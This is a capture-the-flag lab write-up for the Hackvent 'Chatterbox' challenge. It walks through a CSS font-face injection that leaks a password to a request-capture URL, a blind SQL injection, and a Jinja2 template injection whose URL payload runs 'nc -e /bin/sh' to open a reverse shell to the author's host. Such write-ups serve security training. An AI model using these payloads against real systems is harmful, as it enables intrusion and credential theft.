# Day 24: Chatterbox

*... likes to talk*

I love to chat secure and private.

For this I mostly use http://challenges.hackvent.hacking-lab.com:1087.

It's easy to create a private chat and start chatting without a registration.

[Chatterbox](http://challenges.hackvent.hacking-lab.com:1087/)

Hint #1: the admin is a lazy clicker boy and only likes `<a href="..."></a>`  
Hint #2: As a passionate designer, the admin loves different fonts.  
Hint #3: For step 2: I'd better be my own CA.  
Hint #4: For step 2: It's all about the state  
Hint #5: For step 3: python programmers don't need {{ ninjas }}

### Solution

This challenge had three separate stages.

#### Stage 1: CSS injection

The Chatterbox was running on port [1087](http://challenges.hackvent.hacking-lab.com:1087/).

As a regular user I was able to create a private channel with my own CSS. This was very suspicious right from the beginning. Some form of CSS injection? But which and how?

The first hint indicates that it is possible to invite admin to my private channel. It didn't seem so because admin silently joined the channel but didn't respond to any post. I verified his presence by modifying CSS to send GET request to my hookbin on load.

The second hint about fonts sent me to the right direction and I found this [article](http://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html) about @font-face unicode-range vulnerability.

I downloaded original chatterbox CSS and added section like this for each printable character.

```css
@font-face { /* 'a' */
    font-family: pwn;
    src: url("https://hookb.in/E5V2ANXB?char=a");
    unicode-range: U+0061;
}
``` 

It defines my own fictional `pwn` font family and uses hookbin to capture requests for individual characters.

The last step was to add this font family to HTML element `password`.

```css
#password {
    font-family: pwn;
}
```

Complete CSS code can be found [here](files/styles-pwn.css).

Then I invited admin to my channel with this CSS and checked requests captured in my hookbin.

The admin's password was:

```
Christmas2017
```

I simply used it to login and then I got redirected to the [second stage](http://challenges.hackvent.hacking-lab.com:1088?key=E7g24fPcZgL5dg78).

#### Stage 2: SQL injection

The Message Board Admin Panel was running on port [1088](http://challenges.hackvent.hacking-lab.com:1088?key=E7g24fPcZgL5dg78).

This stage contained *Tools* section with a form which generated certificate based on submitted CRS.

Hints 3 and 4 directed me to the `state` field of CSR which suffered from SQL injection. I wrote a script which used blind time-based SQLi on that field to find useful data in the underlying database. It was very time consuming part but I managed to extract link to the last stage from column `private_key` of the first row of table `hv24_2.keystorage`. It contained this value:

```
challenges.hackvent.hacking-lab.com:1089?key=W5zzcusgZty9CNgw
```

#### Stage 3: Template injection

The Easy Webshop was running on port [1089](http://challenges.hackvent.hacking-lab.com:1089?key=W5zzcusgZty9CNgw).

The last hint indicated it has something to do with SSTi vulnerability. I quickly realized it's referencing to [Jinja2](http://jinja.pocoo.org/docs/2.10/) templating engine for Python.

I found this useful [article](https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/) which showed me how to exploit that vulnerability. I found that URL path is vulnerable but it took me some time to put all the necessary things together and make it work.

I started local netcat opened for incoming connections: 

```bash
ncat -p 44444 -k -v -l
```

Then I hit the following URL to get the reverse connection with shell to my local netcat.

```
http://challenges.hackvent.hacking-lab.com:1089/product%7b%7b%20''.__class__.__mro__[1].__subclasses__()[37](['nc -e /bin/sh 94.112.XXX.XXX 44444'],shell=True).communicate()%20%7d%7d?key=W5zzcusgZty9CNgw
```

The last step was to use the remote shell through the local netcat instance.

```bash
$ cat /home/flag
HV17-7h1s-1sju-t4ra-nd0m-flag
```

The result flag:

```
HV17-7h1s-1sju-t4ra-nd0m-flag
```